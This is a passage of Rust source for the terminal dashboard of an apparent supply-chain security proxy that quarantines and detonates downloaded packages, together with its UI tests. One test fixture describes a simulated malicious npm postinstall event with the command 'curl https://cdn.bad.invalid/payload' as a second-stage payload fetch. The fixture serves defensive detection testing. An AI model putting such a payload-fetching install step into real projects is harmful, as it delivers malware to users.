        while hash_end < len && bytes[hash_end].is_ascii_hexdigit() {
            hash_end += 1;
        }

        if hash_end.saturating_sub(end) >= 12 {
            spans.push(Span::styled(
                text[end..hash_end].to_string(),
                palette.hash(),
            ));
        } else if hash_end > end {
            spans.push(Span::styled(
                text[end..hash_end].to_string(),
                palette.neutral(),
            ));
        }

        start = hash_end.max(end + 1).min(len);
        if hash_end == end {
            start = end.saturating_add(1);
        }
    }

    if spans.is_empty() {
        spans.push(Span::styled(text.to_string(), palette.neutral()));
    }
    spans
}

fn style_for_proxy_action(action: ProxyAction, palette: &Palette) -> Style {
    match action {
        ProxyAction::Allow | ProxyAction::Bypass | ProxyAction::Tunnel => palette.success(),
        ProxyAction::Fallback | ProxyAction::Pending => palette.warning(),
        ProxyAction::Blocked => palette.error(),
    }
}

fn style_for_client_outcome(outcome: Option<ClientVisibleOutcome>, palette: &Palette) -> Style {
    match outcome {
        Some(ClientVisibleOutcome::Success) => palette.success(),
        Some(ClientVisibleOutcome::TemporaryFailure) => palette.warning(),
        Some(ClientVisibleOutcome::Blocked | ClientVisibleOutcome::UpstreamError) => {
            palette.error()
        }
        None => palette.muted(),
    }
}

fn style_for_approval(status: ApprovalStatus, palette: &Palette) -> Style {
    match status {
        ApprovalStatus::Approved => palette.success(),
        ApprovalStatus::Pending => palette.warning(),
        ApprovalStatus::Blocked | ApprovalStatus::Revoked => palette.error(),
    }
}

fn style_for_quarantine(status: QuarantineStatus, palette: &Palette) -> Style {
    match status {
        QuarantineStatus::Approved => palette.success(),
        QuarantineStatus::Pending
        | QuarantineStatus::ReadyForAnalysis
        | QuarantineStatus::Analyzing => palette.warning(),
        QuarantineStatus::Blocked => palette.error(),
    }
}

fn style_for_lab_run(status: LabRunStatus, palette: &Palette) -> Style {
    match status {
        LabRunStatus::Passed => palette.success(),
        LabRunStatus::Planned | LabRunStatus::Running | LabRunStatus::Skipped => palette.warning(),
        LabRunStatus::Failed | LabRunStatus::Blocked => palette.error(),
    }
}

fn style_for_verdict(verdict: Verdict, palette: &Palette) -> Style {
    match verdict {
        Verdict::Clean => palette.success(),
        Verdict::Suspicious => palette.warning(),
        Verdict::Malicious => palette.error(),
    }
}

fn status_style(status: &str, palette: &Palette) -> Style {
    let lowered = status.to_ascii_lowercase();
    if lowered.contains("fail") || lowered.contains("error") || lowered.contains("blocked") {
        palette.error()
    } else if lowered.contains("approve")
        || lowered.contains("loaded")
        || lowered.contains("refresh")
    {
        palette.success()
    } else {
        palette.warning()
    }
}

fn format_bytes(bytes: u64) -> String {
    const UNITS: [&str; 5] = ["B", "KB", "MB", "GB", "TB"];
    let mut value = bytes as f64;
    let mut unit = 0usize;
    while value >= 1024.0 && unit < UNITS.len() - 1 {
        value /= 1024.0;
        unit += 1;
    }
    if unit == 0 {
        format!("{} {}", bytes, UNITS[unit])
    } else {
        format!("{value:.1} {}", UNITS[unit])
    }
}

fn format_timestamp(timestamp: DateTime<Utc>) -> String {
    timestamp.format("%Y-%m-%d %H:%M:%S UTC").to_string()
}

fn empty_snapshot() -> DashboardSnapshot {
    DashboardSnapshot {
        overview: OverviewModel {
            captured_requests: 0,
            manifest_records: 0,
            quarantine_jobs: 0,
            lab_runs: 0,
            evidence_bundles: 0,
            feed_records: 0,
            node_sessions: 0,
        },
        storage_summary: StorageSummaryModel {
            total_repos_downloaded: 0,
            total_storage_bytes: 0,
            latest_download_at: None,
            latest_download_size_bytes: None,
            snapshot_generated_at: Utc::now(),
        },
        activity: vec![],
        manifest_records: vec![],
        quarantine_jobs: vec![],
        lab_runs: vec![],
        evidence: vec![],
        feed: vec![],
        nodes: vec![],
    }
}

#[cfg(test)]
mod tests {
    use chrono::Utc;
    use ratatui::{Terminal, backend::TestBackend};
    use zitpit_core::{
        ApprovalStatus, CacheDomain, CacheEntry, Classification, CodeIntent, DetectionSeverity,
        DetonationPersona, DetonationScenario, Ecosystem, EvidenceEvent, LabRunStatus, NodeSession,
        ProxyAction, QuarantineJob, QuarantineStatus, RequestObservation, SelectorKind,
        TripwireEvaluator, TripwireKind,
    };

    use super::*;

    fn render_text(app: &App) -> String {
        let backend = TestBackend::new(140, 40);
        let mut terminal = Terminal::new(backend).expect("terminal");
        terminal.draw(|frame| draw(frame, app)).expect("draw");
        terminal
            .backend()
            .buffer()
            .content()
            .iter()
            .map(|cell| cell.symbol())
            .collect::<String>()
    }

    fn sample_artifact() -> ArtifactCoordinate {
        ArtifactCoordinate {
            ecosystem: Ecosystem::Git,
            source: "https://github.com/acme/widget.git".to_string(),
            requested_selector: "refs/heads/main".to_string(),
            selector_kind: SelectorKind::Branch,
        }
    }

    fn sample_snapshot(status: ApprovalStatus, verdict: zitpit_core::Verdict) -> DashboardSnapshot {
        let artifact = sample_artifact();
        let downloaded_at = Utc::now();
        let summary = TripwireEvaluator::evaluate(
            artifact.clone(),
            DetonationPersona::DeveloperWorkstation,
            DetonationScenario::InstallBuild,
            vec![EvidenceEvent {
                timestamp: Utc::now(),
                kind: TripwireKind::Downloader,
                subject: "https://cdn.bad.invalid/payload".to_string(),
                detail: "second stage payload fetch".to_string(),
                severity: DetectionSeverity::High,
                phase: Some(zitpit_core::PackageLifecyclePhase::Install),
                process_lineage: vec!["npm install".to_string(), "node postinstall.js".to_string()],
                command: Some("curl https://cdn.bad.invalid/payload".to_string()),
                file_path: None,
                network_target: Some("cdn.bad.invalid".to_string()),
                network_protocol: Some("https".to_string()),
                sinkhole_transcript_sha256: None,
                scenario_step: Some("fetch_second_stage".to_string()),
                canary_id: None,
                attack_family_tag: None,
            }],
        );
        let summary = zitpit_core::EvidenceRecord { verdict, ..summary };
        DashboardSnapshot {
            overview: OverviewModel {
                captured_requests: 1,
                manifest_records: 1,
                quarantine_jobs: 1,
                lab_runs: 1,
                evidence_bundles: 1,
                feed_records: 1,
                node_sessions: 1,
            },
            storage_summary: StorageSummaryModel {
                total_repos_downloaded: 1,
                total_storage_bytes: 4_194_304,
                latest_download_at: Some(downloaded_at),
                latest_download_size_bytes: Some(4_194_304),
                snapshot_generated_at: downloaded_at,
            },
            activity: vec![CapturedRequest {
                request_id: uuid::Uuid::new_v4(),
                observation: RequestObservation {
                    request_id: uuid::Uuid::new_v4(),
                    observed_at: Utc::now(),
                    scheme: "https".to_string(),
                    authority: "github.com".to_string(),
                    path: "/acme/widget.git".to_string(),
                    method: "GET".to_string(),
                    user_agent: Some("git/2.47".to_string()),
                    headers: Default::default(),
                    selector_hint: None,
                },
                classification: Classification {
                    lane: zitpit_core::TrafficLane::CodeIntake,
                    ecosystem: Some(Ecosystem::Git),
                    intent: CodeIntent::GitRemote,
                    reason: "known Git hosting domain".to_string(),
                    confidence: 95,
                    requires_quarantine: true,
                    host_family: Some("github.com".to_string()),
                },
                proxy_action: ProxyAction::Pending,
                status_code: Some(503),
                bytes_in: Some(0),
                bytes_out: Some(0),
                stored_body: true,
                client_outcome: Some(zitpit_core::ClientVisibleOutcome::TemporaryFailure),
                decision_reason: "requested selector is pending detonation or hold window"
                    .to_string(),
                artifact_key: Some(artifact.clone().into()),
                trace: zitpit_core::ProxyTrace::new(None, None, Utc::now())
                    .with_decision("ui fixture")
                    .with_event(zitpit_core::ProxyTraceKind::LabScheduled, "lab scheduled")
                    .with_event(
                        zitpit_core::ProxyTraceKind::HashCompleted,
                        format!("commit={} tree={}", "f".repeat(40), "a".repeat(40)),
                    )
                    .with_completion("pending"),
            }],
            manifest_records: vec![],
            quarantine_jobs: vec![QuarantineJob {
                job_id: uuid::Uuid::new_v4(),
                artifact_key: artifact.clone().into(),
                status: QuarantineStatus::Pending,
                created_at: Utc::now(),
                hold_until: Utc::now(),
                last_error: None,
                cache_entry: Some(CacheEntry {
                    artifact_key: artifact.clone().into(),
                    domain: CacheDomain::Quarantine,
                    storage_path: "/var/lib/zitpit/git/quarantine/acme/widget.git".to_string(),
                    created_at: downloaded_at,
                    size_bytes: Some(4_194_304),
                    digest_sha256: "9".repeat(64),
                }),
            }],
            lab_runs: vec![LabRun {
                run_id: uuid::Uuid::new_v4(),
                artifact_key: artifact.clone().into(),
                status: LabRunStatus::Running,
                planned_at: Utc::now(),
                started_at: Some(Utc::now()),
                finished_at: None,
                personas: vec![DetonationPersona::DeveloperWorkstation],
                scenarios: vec![DetonationScenario::InstallBuild],
                firecracker_config_path: None,
                firecracker_api_socket: None,
                tap_device: None,
                command_preview: vec!["/bin/true".to_string()],
                notes: vec!["running".to_string()],
            }],
            evidence: vec![EvidenceBundle {
                evidence_id: uuid::Uuid::new_v4(),
                artifact_key: artifact.clone().into(),
                run_id: None,
                summary,
                sinkhole_transcript: vec!["sinkhole hit".to_string()],
            }],
            feed: vec![HourlyFeedRecord {
                artifact,
                status,
                first_seen_at: Utc::now(),
                confidence: DetectionSeverity::High,
                trigger_category: Some(TripwireKind::Downloader),
                recommended_action: "hold and inspect".to_string(),
                approved_fallback: None,
            }],
            nodes: vec![NodeSession {
                node_id: "node-1".to_string(),
                user_label: "developer".to_string(),
                hostname: "workspace-1".to_string(),
                policy_version: "v1".to_string(),
                ca_version: "ca-v1".to_string(),
                transparent_capture: true,
                last_seen_at: Utc::now(),
            }],
        }
    }

    #[test]
    fn renders_overview_screen() {
        let app = App::new(
            AdminClient::from_local_defaults(),
            sample_snapshot(ApprovalStatus::Pending, zitpit_core::Verdict::Suspicious),
        );
        let text = render_text(&app);
        assert!(text.contains("Protected Session"));
        assert!(text.contains("Storage Radar"));
        assert!(text.contains("Repos downloaded"));
        assert!(text.contains("Total storage"));
    }

    #[test]
    fn screen_titles_are_stable() {
        let titles = Screen::all().map(|screen| screen.title());
        assert_eq!(
            titles,
            [
                "Overview",
                "Activity",
                "Quarantine",
                "Lab Runs",
                "Evidence",
                "Feed",
                "Nodes",
                "Status"
            ]
        );
    }

    #[test]
    fn renders_pending_unknown_detail_chain() {
        let mut app = App::new(
            AdminClient::from_local_defaults(),
            sample_snapshot(ApprovalStatus::Pending, zitpit_core::Verdict::Suspicious),
        );
        app.selected_screen = 2;
        let text = render_text(&app);
        assert!(text.contains("Correlated Detail"));
        assert!(text.contains("request:"));
        assert!(text.contains("lab_run:"));
        assert!(text.contains("evidence:"));
        assert!(text.contains("feed: Pending"));
        assert!(text.contains("cache_size:"));
    }

    #[test]
    fn renders_blocked_and_malicious_views() {
        let mut app = App::new(
            AdminClient::from_local_defaults(),
            sample_snapshot(ApprovalStatus::Blocked, zitpit_core::Verdict::Malicious),
        );
        app.selected_screen = 4;
        let evidence = render_text(&app);
        assert!(evidence.contains("Evidence Detail"));
        assert!(evidence.contains("Malicious"));
        assert!(evidence.contains("Downloader"));

        app.selected_screen = 5;
        let feed = render_text(&app);
        assert!(feed.contains("Feed Detail"));
        assert!(feed.contains("Blocked"));
    }

    #[test]
    fn activity_screen_shows_metrics_and_hash_lines() {
        let mut app = App::new(
            AdminClient::from_local_defaults(),
            sample_snapshot(ApprovalStatus::Pending, zitpit_core::Verdict::Suspicious),
        );
        app.selected_screen = 1;
        let text = render_text(&app);
        assert!(text.contains("Ops Pulse"));
        assert!(text.contains("Latest size"));
        assert!(text.contains("commit="));
        assert!(text.contains("tree="));
    }

    #[test]
    fn operator_workflow_applies_refreshed_snapshot() {
        let mut app = App::new(
            AdminClient::from_local_defaults(),
            sample_snapshot(ApprovalStatus::Pending, zitpit_core::Verdict::Suspicious),
        );
        app.selected_screen = 2;
        assert_eq!(
            app.selected_coordinate().expect("coordinate").source,
            "https://github.com/acme/widget.git"
        );
        let approved_snapshot = DashboardSnapshot {
            quarantine_jobs: vec![],
            feed: vec![HourlyFeedRecord {
                status: ApprovalStatus::Approved,
                ..sample_snapshot(ApprovalStatus::Approved, zitpit_core::Verdict::Suspicious)
                    .feed
                    .into_iter()
                    .next()
                    .expect("feed")
            }],
            ..sample_snapshot(ApprovalStatus::Approved, zitpit_core::Verdict::Suspicious)
        };
        app.apply_snapshot(approved_snapshot, "Approved selected artifact");
        assert!(app.snapshot.quarantine_jobs.is_empty());
        assert_eq!(app.status, "Approved selected artifact");
        app.selected_screen = 5;
        let text = render_text(&app);
        assert!(text.contains("Approved"));
    }
}
